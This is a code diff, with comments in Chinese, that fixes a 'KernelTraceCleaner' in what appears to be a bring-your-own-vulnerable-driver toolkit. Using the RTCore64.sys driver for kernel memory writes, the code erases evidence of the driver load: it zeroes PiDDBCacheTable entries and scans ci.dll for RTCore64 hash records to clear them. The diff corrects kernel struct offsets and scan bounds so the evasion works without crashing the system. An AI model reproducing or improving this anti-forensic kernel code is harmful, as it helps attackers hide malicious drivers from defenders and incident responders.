@@ -2445,40 +2445,42 @@ static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original)
 // ============================================================
 
 // === 内核数据结构定义 (x64) ===
+// ★ v3.126m-review: 修复 — 移除 pack(1), 内核使用自然 8 字节对齐
+//   pack(1) 导致 RTL_BALANCED_LINKS 被压为 28 字节, 而内核实际是 32 字节
+//   这会级联导致所有后续字段偏移错误 4 字节, 写入时损坏 AVL Balance → BSOD
 
-// RTL_AVL_TABLE — 平衡二叉树表头 (用于 PiDDBCacheTable)
-#pragma pack(push, 1)
+// RTL_BALANCED_LINKS — 内核实际布局 (sizeof=0x20=32)
 struct KernRTL_BALANCED_LINKS {
     uint64_t Parent;        // +0x00
     uint64_t LeftChild;     // +0x08
     uint64_t RightChild;    // +0x10
-    uint8_t  IsLeftChild;   // +0x18
-    uint8_t  Balance;       // +0x19
-    uint8_t  Reserved[2];   // +0x1A
+    uint8_t  Balance;       // +0x18 (CHAR, -1/0/+1)
+    uint8_t  Reserved[3];   // +0x19 (padding to 8-byte boundary)
+    uint32_t IsLeftChild;   // +0x1C (BOOLEAN but padded to 4 bytes)
 };
 
+// RTL_AVL_TABLE — 内核实际布局 (sizeof=0x78=120)
 struct KernRTL_AVL_TABLE {
-    KernRTL_BALANCED_LINKS BalancedRoot;  // +0x00 (24 bytes)
-    uint64_t OrderedPointer;              // +0x18
-    uint32_t WhichOrderedElement;         // +0x20
-    uint32_t NumberGenericTableElements;  // +0x24
-    uint32_t DepthOfTree;                 // +0x28
-    uint8_t  Rest[0x4C];                  // padding to ~0x78
+    KernRTL_BALANCED_LINKS BalancedRoot;  // +0x00 (32 bytes)
+    uint64_t OrderedPointer;              // +0x20
+    uint32_t WhichOrderedElement;         // +0x28
+    uint32_t NumberGenericTableElements;  // +0x2C
+    uint32_t DepthOfTree;                 // +0x30
+    // padding to 0x78
 };
 
-// PiDDBCacheTable 条目 — 实际偏移因 Windows 版本而异
-// 通用格式 (Win10 21H2+ / Win11):
-//   +0x00: RTL_BALANCED_LINKS Links (24 bytes)
-//   +0x18: UNICODE_STRING  DriverName (16 bytes → Buffer 指针在 +0x20)
-//   +0x28: LARGE_INTEGER   TimeDateStamp (8 bytes)
+// PiDDBCacheTable 条目 — 内核实际布局
+//   +0x00: RTL_BALANCED_LINKS Links (32 bytes → 到 +0x20)
+//   +0x20: UNICODE_STRING  DriverName (16 bytes)
+//   +0x30: LARGE_INTEGER   TimeDateStamp (8 bytes)
 struct KernPiDDBCacheEntry {
-    KernRTL_BALANCED_LINKS Links;         // +0x00 (24 bytes)
-    uint16_t DriverNameLength;            // +0x18
-    uint16_t DriverNameMaxLength;         // +0x1A
-    uint64_t DriverNameBuffer;            // +0x20 (内核池指针 → PWSTR)
-    uint64_t TimeDateStamp;               // +0x28
+    KernRTL_BALANCED_LINKS Links;         // +0x00 (32 bytes)
+    uint16_t DriverNameLength;            // +0x20 (UNICODE_STRING.Length)
+    uint16_t DriverNameMaxLength;         // +0x22 (UNICODE_STRING.MaximumLength)
+    uint32_t Padding;                     // +0x24 (padding)
+    uint64_t DriverNameBuffer;            // +0x28 (UNICODE_STRING.Buffer → 内核池 PWSTR)
+    uint64_t TimeDateStamp;               // +0x30
 };
-#pragma pack(pop)
 
 // MmUnloadedDrivers 扫描参数
 static const int MM_UNLOADED_MAX      = 50;    // 最多记录 50 条
@@ -2507,6 +2509,8 @@ static const wchar_t* g_traceTargetNames[] = {
 };
 
 static bool IsTraceTarget(const std::wstring& name) {
+    // ★ v3.126m-review: 修复 — 精确匹配 (wcsstr 包含匹配已足够, 但不误伤)
+    //   只匹配全名中包含 RTCore64.sys 或 RTCore64 的条目
     for (int i = 0; g_traceTargetNames[i]; i++) {
         if (name.find(g_traceTargetNames[i]) != std::wstring::npos)
             return true;
@@ -2625,8 +2629,9 @@ static int TraverseAndClearPiDDBAVL(uint64_t nodeAddr, int depth) {
             // 清零节点: 清除 DriverName UNICODE_STRING 和 TimeDateStamp
             //  不能删除 AVL 节点 (需要重新平衡树, 风险大), 改为使其不可识别
             //  写入 NULL Buffer 和零 Length, Name 变为空字符串
-            uint64_t fieldAddr = nodeAddr + 0x18; // UNICODE_STRING 起始
-            uint8_t zeros[24] = {}; // 覆盖 Length(2)+Max(2)+Buffer(8)+pad(4)+TimeDateStamp(8)
+            //  ★ v3.126m-review: 偏移修正 — UNICODE_STRING 在 +0x20 (不是 +0x18)
+            uint64_t fieldAddr = nodeAddr + 0x20; // UNICODE_STRING 起始
+            uint8_t zeros[24] = {}; // 覆盖 Length(2)+Max(2)+pad(4)+Buffer(8)+TimeDateStamp(8)
             kma.WriteKernelVA(fieldAddr, zeros, sizeof(zeros));
             cleared++;
         }
@@ -2793,8 +2798,9 @@ bool KernelTraceCleaner::ClearCiHashBucket(uint64_t ciBase) {
     //   每个桶条目包含: 驱动哈希, 证书链, 文件名
     // 策略: 扫描 ci.dll 的 .data 段寻找包含 "RTCore64" 字符串的哈希条目
 
+    // ★ v3.126m-review: 修复 — 缩减扫描范围到 3MB (ci.dll 典型大小 < 2MB)
     uint64_t ciDataStart = ciBase + 0x10000;  // ci.dll .data 段大致起始
-    uint64_t ciDataEnd = ciBase + 0x500000;    // ci.dll 典型大小 < 5MB
+    uint64_t ciDataEnd = ciBase + 0x300000;    // ci.dll 典型大小 ~1.5MB, 上限 3MB
 
     int cleared = 0;
     // 逐页扫描 ci.dll 的数据段
@@ -2803,7 +2809,8 @@ bool KernelTraceCleaner::ClearCiHashBucket(uint64_t ciBase) {
         if (!kma.ReadKernelVA(addr, page, sizeof(page)))
             continue;
 
-        for (size_t off = 0; off < sizeof(page) - 32; off++) {
+        // ★ v3.126m-review: 修复 — off 从 8 开始 (防止 page + off - 8 越界读取栈前数据)
+        for (size_t off = 8; off < sizeof(page) - 32; off++) {
             // 寻找可能的 Unicode 字符串指针 → 池地址 (高位地址, 不在 ci.dll 模块内)
             uint64_t strPtr = *(uint64_t*)(page + off);
             uint16_t strLen = *(uint16_t*)(page + off - 8);
